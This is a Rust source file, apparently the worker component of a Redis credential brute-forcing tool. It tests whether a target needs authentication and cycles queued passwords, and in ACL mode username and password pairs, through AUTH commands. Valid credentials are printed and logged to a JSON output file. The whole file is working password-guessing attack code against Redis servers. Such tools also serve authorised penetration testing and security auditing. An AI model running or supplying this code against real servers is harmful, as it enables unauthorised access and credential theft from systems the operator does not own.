use crate::Args;
use std::process;
use parking_lot::RwLock;
use std::sync::{Arc};
use crossbeam_queue::{SegQueue};
use crate::connection::Connection;
use std::fs::OpenOptions;
use std::io::Write;
use chrono::Utc;
use std::time::Duration;
// use serde_json::json;

enum RedisMode {
    DEFAULT,
    ACL
}

pub struct Worker {
    users: Arc<RwLock<Vec<String>>>,
    q: Arc<SegQueue<String>>,
    connection: Connection,
    current_password: String,
    finished_users: Vec<usize>,
    mode: RedisMode,
    output_file: Option<String>,
    ip: String,
    port: String,
}

impl Worker {
    pub fn get_ip(&self) -> &str {
        &self.ip
    }
    pub fn get_port(&self) -> &str {
        &self.port
    }
    pub fn check_authentication(&mut self) -> bool {
        let response = self.connection.send_and_receive("PING\r\n".to_string());

        if response.starts_with(b"-NOAUTH") {
            println!("[*] Authentication is required for target {}:{}.", self.ip, self.port);
            return true;  // Authentication is configured
        } else if response.starts_with(b"+PONG") {
            println!("[-] No authentication required for target {}:{}.", self.ip, self.port);
            self.save_to_file("n/a".to_string(), "n/a".to_string()); // Save result indicating no auth required
            return false; // No authentication required
        } else {
            println!("[?] Unexpected response from target {}:{}.", self.ip, self.port);
            return false; // Default to no authentication required
        }
    }

    pub fn run_queue(&mut self) {
        while !self.q.is_empty() {
            match self.q.pop() {
                Some(password) => {
                    self.current_password = password;
                    self.check_password();
                },
                None => continue,
            }
        }
    }


    fn check_non_acl(&mut self) {
        let response = self.connection.send_and_receive(format!("AUTH '{}'\r\n", self.current_password));

        if response[0] == 43 {
            println!("[+] Valid password found for target {}:{} - {}", self.ip, self.port, &self.current_password);
            self.save_to_file("n/a".to_string(), self.current_password.clone());
            // Do not exit, but stop checking other passwords for this target
        }
    }

    fn check_acl(&mut self) {
        let users_read = self.users.read();
        for (pos, user) in users_read.iter().enumerate() {
            let response = self
                                .connection
                                .send_and_receive(format!("AUTH '{}' '{}'\r\n", user, self.current_password));
            if response[0] == 43 {
                println!("[+] Valid credentials found for target {}:{} - {}:{}", self.ip, self.port, user, &self.current_password);
                self.save_to_file(user.clone(), self.current_password.clone());
                self.finished_users.push(pos);
                break; // Exit the loop once a valid credential is found
            }
        }
        drop(users_read); // Explicitly drop the immutable borrow here

        // Clean up after finding valid credentials, if any
        if self.finished_users.len() > 0 {
            self.clean_found_users();
        }
    }

    fn clean_found_users(&mut self) {
        let mut users_write = self.users.write();

        let mut removed = 0;
        for position in self.finished_users.iter() {
            users_write.remove(position - removed);
            removed += 1;
        }

        if removed > 0 {
            if users_write.len() == 0 {
                println!("[*] Valid credentials found for all possible users, exiting.");
                process::exit(1);
            } else {
                println!("[?] {} user(s) remaining...", users_write.len());
            }
        }

        self.finished_users.clear();
    }

    fn check_password(&mut self) {
        match self.mode {
            RedisMode::DEFAULT => {
                self.check_non_acl();
            },
            RedisMode::ACL => {
                self.check_acl();
            }
        }
    }

    fn save_to_file(&self, username: String, password: String) {
        if let Some(ref file_path) = self.output_file {
            let timestamp = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();

            // Construct the JSON string to ensure the field order
            let json_string = format!(
                "{{\"timestamp\":\"{}\",\"ip\":\"{}\",\"port\":\"{}\",\"username\":\"{}\",\"password\":\"{}\"}}",
                timestamp, self.ip, self.port, username, password
            );

            let mut file = OpenOptions::new()
                .append(true)  // Always append after the initial cleanup
                .open(file_path)
                .expect("Unable to open output file in append mode");

            writeln!(file, "{}", json_string).expect("Unable to write to output file");
        }
    }
    
}

impl Worker {
    pub fn new(users: Arc<RwLock<Vec<String>>>, q: Arc<SegQueue<String>>, args: Arc<Args>, target: String) -> Worker {
        let (ip, port) = parse_target(&target); // Parse target into IP and port
        let mode = if args.users == "" { RedisMode::DEFAULT } else { RedisMode::ACL };
        let timeout = Duration::from_secs(args.timeout); // Corrected timeout handling
        Worker { 
            users: users, 
            q: q, 
            connection: Connection::new(&ip, &port, timeout),
            current_password: String::new(),
            mode: mode,
            finished_users: Vec::new(),
            output_file: args.output_file.clone(),
            ip: ip,
            port: port,
        }
    }
}

// Helper function to parse the target into IP and port
fn parse_target(target: &String) -> (String, String) {
    let parts: Vec<&str> = target.split(':').collect();
    let ip = parts[0].to_string();
    let port = if parts.len() > 1 {
        parts[1].to_string()
    } else {
        "6379".to_string()
    };
    (ip, port)
}
